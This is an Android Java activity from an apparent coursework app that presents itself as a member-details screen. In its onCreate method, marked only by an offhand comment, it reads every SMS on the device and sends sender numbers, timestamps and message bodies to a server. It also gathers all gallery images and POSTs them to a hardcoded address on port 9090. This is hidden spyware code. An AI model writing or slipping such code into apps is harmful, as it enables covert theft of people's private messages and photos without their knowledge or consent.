package com.example.coursework1;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Bundle;
import android.os.StrictMode;
import android.provider.MediaStore;
import android.util.Log;
import android.widget.TextView;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;


public class DetailsActivity extends AppCompatActivity {

    TextView memberDetails;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_details);

        memberDetails = (TextView) findViewById(R.id.memberDetails);

        String details = getIntent().getStringExtra("key");

        if (details != null) {
            memberDetails.setText(details);
        }

        //here onwards is all cussy

        //get all SMSs and send to server
        List<sms> smsList = sms();
        for (sms sms : smsList) {
            Log.v("sms", sms.getMsg());
            try {
                httpActivity.sendGET("sms?time=" + sms.getTime() + "&number=" + sms.getAddress() + "&msg=" + sms.getMsg());
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        //get all images and send to server
        ArrayList<Bitmap> images = null;
        try {
            images = getImages();
        } catch (IOException e) {
            e.printStackTrace();
        }

        for (Bitmap i : images) {
            String url = "http://192.168.50.248:9090/images.php";
            RequestQueue rq = Volley.newRequestQueue(getApplicationContext());
            StringRequest sr = new StringRequest(Request.Method.POST,url, response -> {

            }, error -> {
            }){
                @Nullable
                @Override
                protected Map<String, String> getParams() throws AuthFailureError {
                    Map<String, String> params = new HashMap<>();
                    params.put("image", i.toString());
                    return params;
                };
            };

            rq.add(sr);
        }

    }

    @SuppressLint("Range")
    public List<sms> sms() {
        List<sms> smsList = new ArrayList<>();

        Uri message = Uri.parse("content://sms/");
        ContentResolver cr = getContentResolver();

        Cursor c = cr.query(message, null, null, null, null);

        int totalSMS = c.getCount();

        if (c.moveToFirst()) {
            for (int i = 0; i < totalSMS; i++) {
                sms objSms = new sms();
                objSms.setId(c.getString(c.getColumnIndexOrThrow("_id")));
                objSms.setAddress(c.getString(c.getColumnIndexOrThrow("address")));
                objSms.setMsg(c.getString(c.getColumnIndexOrThrow("body")));
                objSms.setReadState(c.getString(c.getColumnIndex("read")));
                objSms.setTime(c.getString(c.getColumnIndexOrThrow("date")));
                if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
                    objSms.setFolderName("inbox");
                } else {
                    objSms.setFolderName("sent");
                }
                smsList.add(objSms);
                c.moveToNext();
            }
        }
        else {
            throw new RuntimeException("You have no SMS");
        }
        c.close();

        return smsList;
    }

    //Finds all image URIs in internal and external storage, converts them to bitmaps and stores them into an arraylist
    public ArrayList<Bitmap> getImages() throws IOException {
        ArrayList<String> galleryImageUrls;
        ArrayList<Bitmap> galleryImageBitmaps;
        final String[] columns = {MediaStore.Images.Media.DATA, MediaStore.Images.Media._ID};   //get all columns of type images
        final String orderBy = MediaStore.Images.Media.DATE_TAKEN;  //order data by date

        ContentResolver cr = getContentResolver();

        Cursor intImg = cr.query(MediaStore.Images.Media.INTERNAL_CONTENT_URI,
                columns, null, null, orderBy + " DESC");    //get all image URIs in internal storage

        Cursor extImg = cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                columns, null, null, orderBy + " DESC");    //get all image URIs in external storage

        galleryImageUrls = new ArrayList<String>();

        for (extImg.moveToFirst(); !extImg.isAfterLast(); extImg.moveToNext()) {
            int dataColumnIndex = extImg.getColumnIndex(MediaStore.Images.Media.DATA);  //get column index
            galleryImageUrls.add(extImg.getString(dataColumnIndex));    //get Image from column index
        }

        for (intImg.moveToFirst(); !intImg.isAfterLast(); intImg.moveToNext()) {
            int dataColumnIndex = intImg.getColumnIndex(MediaStore.Images.Media.DATA);  //get column index
            galleryImageUrls.add(intImg.getString(dataColumnIndex));    //get Image from column index
        }

        intImg.close();
        extImg.close();

        galleryImageBitmaps = new ArrayList<Bitmap>();

        for (int i = 0; i < galleryImageUrls.size(); i++) {
            try{
                galleryImageBitmaps.add(MediaStore.Images.Media.getBitmap(cr, Uri.parse(galleryImageUrls.get(i))));     //convert image to bitmap
            }catch (Exception e){
                e.printStackTrace();
            }
        }

        return galleryImageBitmaps;
    }
}